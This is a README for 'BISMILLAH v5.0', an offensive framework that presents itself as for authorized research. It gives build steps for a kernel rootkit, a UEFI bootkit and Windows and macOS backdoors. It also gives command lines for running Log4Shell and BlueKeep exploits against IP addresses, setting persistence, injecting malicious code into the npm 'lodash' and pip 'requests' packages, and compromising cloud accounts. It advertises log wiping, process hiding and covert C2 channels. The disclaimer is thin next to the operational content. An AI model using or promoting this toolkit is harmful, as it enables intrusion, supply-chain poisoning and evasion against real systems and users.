# BISMILLAH v5.0 - State-Level APT Framework

## ⚠️ CRITICAL SECURITY NOTICE

**This tool is designed for authorized cybersecurity research and penetration testing ONLY.**

- **Use only in controlled, isolated environments**
- **Requires proper authorization and legal clearance**
- **Not for use against unauthorized targets**
- **The authors are not responsible for any misuse**

## 🚀 Overview

BISMILLAH v5.0 is an advanced persistent threat (APT) framework designed for state-level cybersecurity research. It provides comprehensive capabilities for:

- **Zero-day exploit integration and management**
- **Advanced evasion and anti-analysis techniques**
- **AI-driven autonomous operations**
- **Multi-vector persistence mechanisms**
- **Advanced C2 channels (HTTP, DNS, ICMP)**
- **Supply chain poisoning capabilities**
- **Cloud infrastructure compromise**
- **Hardware-level persistence**

## 🛠️ Installation

### Quick Start

```bash
# Clone the repository
git clone <repository-url>
cd bismillah_repo

# Run the automated installer
python3 install_and_run.py
```

### Manual Installation

1. **Install Python Dependencies**
```bash
pip install -r requirements.txt
```

2. **Compile C Components**
```bash
# Kernel rootkit (Linux)
cd kernel_rootkit && make

# UEFI bootkit
cd uefi_bootkit && make

# Windows payloads
cd windows_payloads
gcc -o service_backdoor.exe service_backdoor.c
gcc -o reg_hijack.exe reg_hijack.c
gcc -o com_handler_regsvr.exe com_handler_regsvr.c

# macOS payloads
cd macos_payloads
gcc -o mem_malware mem_malware.c
gcc -o tcc_allowlist_bypass tcc_allowlist_bypass.c
```

3. **Generate SSL Certificates**
```bash
mkdir certs
openssl req -x509 -newkey rsa:4096 -keyout certs/bismillah.key -out certs/bismillah.crt -days 365 -nodes -subj "/C=US/ST=State/L=City/O=Organization/CN=bismillah.local"
```

## 🎯 Usage

### Basic Execution

```bash
# Run the main framework
python3 bismillah.py

# Run with specific threat level
python3 bismillah.py --threat-level aggressive

# Run in stealth mode
python3 bismillah.py --threat-level stealth
```

### Command Line Interface

```bash
# Reconnaissance
python3 hey_mama.py --scan 192.168.1.0/24
python3 hey_mama.py --shodan "apache country:US"
python3 hey_mama.py --dnsenum example.com

# Exploitation
python3 hey_mama.py --run_exploit cve_2021_44228_log4j 10.0.0.5
python3 hey_mama.py --can_run cve_2019_0708_bluekeep 192.168.1.50

# Persistence
python3 hey_mama.py --persist_linux /usr/local/bin/bismillah
python3 hey_mama.py --persist_win_schtask C:\Windows\System32\bismillah.bat

# Supply Chain
python3 hey_mama.py --npm_inject lodash /path/to/malicious.js
python3 hey_mama.py --pip_inject requests /path/to/malicious.py

# Cloud Compromise
python3 hey_mama.py --cloud_aws
python3 hey_mama.py --cloud_azure
python3 hey_mama.py --cloud_gcp
```

## 🔧 Configuration

Edit `config.json` to customize:

- **C2 Settings**: HTTP, DNS, ICMP channels
- **Persistence**: Service names, registry keys, paths
- **Exploits**: Metasploit integration, timeouts
- **Stealth**: Anti-VM, anti-debug, process hiding
- **AI Integration**: OpenAI API keys, local models

## 🏗️ Architecture

### Core Components

1. **Main Dispatcher** (`bismillah.py`)
   - Orchestrates all modules
   - Manages threat levels
   - Handles signal processing

2. **Advanced Modules**
   - `zero_day_exploits.py`: Zero-day PoC framework
   - `advanced_evasion.py`: Anti-analysis techniques
   - `hardware_persistence.py`: Firmware-level persistence
   - `autonomous_ai.py`: AI-driven decision making
   - `multi_vector_c2.py`: Multi-channel C2
   - `sandbox_detection.py`: VM/sandbox detection
   - `memory_manipulation.py`: Process memory operations
   - `network_manipulation.py`: Network interface control

3. **Exploit Library**
   - BlueKeep (CVE-2019-0708)
   - SMBGhost (CVE-2020-0796)
   - ProxyLogon (CVE-2021-26855)
   - Log4Shell (CVE-2021-44228)
   - PrintNightmare (CVE-2021-34527)
   - Follina (CVE-2022-30190)

4. **Persistence Mechanisms**
   - Linux: systemd, udev, cron, kernel modules
   - Windows: Scheduled tasks, registry, services, drivers
   - macOS: LaunchDaemons, kexts, bootkits

5. **C2 Channels**
   - HTTPS with TLS encryption
   - DNS tunneling with DoH
   - ICMP data exfiltration
   - WebSocket real-time communication

## 🔒 Security Features

### Evasion Techniques

- **Anti-VM Detection**: Checks for VM artifacts
- **Anti-Debug**: Detects debugging tools
- **Process Hiding**: Conceals malicious processes
- **Log Wiping**: Removes forensic traces
- **Memory Manipulation**: Hides in process memory

### Persistence Layers

- **User Level**: Scheduled tasks, startup items
- **System Level**: Services, drivers, kernel modules
- **Firmware Level**: UEFI bootkits, BIOS persistence
- **Hardware Level**: Flash memory manipulation

### C2 Obfuscation

- **Encrypted Communication**: AES-GCM encryption
- **Protocol Blending**: Mimics legitimate traffic
- **Channel Rotation**: Multiple fallback channels
- **Traffic Shaping**: Evades detection systems

## 🧪 Testing

### Unit Tests

```bash
# Run all tests
python3 -m pytest tests/

# Run specific test categories
python3 -m pytest tests/test_exploits.py
python3 -m pytest tests/test_persistence.py
python3 -m pytest tests/testc2.py
```

### Integration Tests

```bash
# Test C2 communication
python3 tools/c2_server.py &
python3 tools/dns_c2_server.py &

# Test exploit functionality
python3 -c "from modules.exploit_manager import run_exploit; print(run_exploit('test', '127.0.0.1'))"
```

## 📊 Capabilities Matrix

| Capability | Linux | Windows | macOS |
|------------|-------|---------|-------|
| Reconnaissance | ✅ | ✅ | ✅ |
| Exploitation | ✅ | ✅ | ✅ |
| Persistence | ✅ | ✅ | ✅ |
| Evasion | ✅ | ✅ | ✅ |
| C2 Communication | ✅ | ✅ | ✅ |
| Supply Chain | ✅ | ✅ | ✅ |
| Cloud Compromise | ✅ | ✅ | ✅ |
| Hardware Persistence | ✅ | ⚠️ | ⚠️ |

## 🚨 Legal and Ethical Considerations

### Authorized Use Only

This tool is intended for:

- **Authorized penetration testing**
- **Security research in controlled environments**
- **Government cybersecurity operations**
- **Educational purposes with proper safeguards**

### Prohibited Uses

- **Unauthorized access to systems**
- **Attacks against production environments**
- **Criminal activities**
- **Espionage against unauthorized targets**

### Compliance

- **Follow local and international laws**
- **Obtain proper authorization**
- **Document all activities**
- **Respect privacy and data protection**

## 🆘 Support and Reporting

### Issues and Bugs

Report issues through:
- GitHub Issues (for technical problems)
- Security advisories (for vulnerabilities)

### Responsible Disclosure

If you discover vulnerabilities in this tool:
1. **Do not exploit them publicly**
2. **Report privately to the maintainers**
3. **Allow time for fixes**
4. **Coordinate disclosure**

## 📝 License

This software is provided for authorized research use only. All rights reserved.

## 🔗 Related Projects

- **Metasploit Framework**: Exploitation framework
- **Cobalt Strike**: Commercial C2 platform
- **Impacket**: Network protocol library
- **Scapy**: Packet manipulation

---

**Remember: With great power comes great responsibility. Use this tool ethically and legally.** 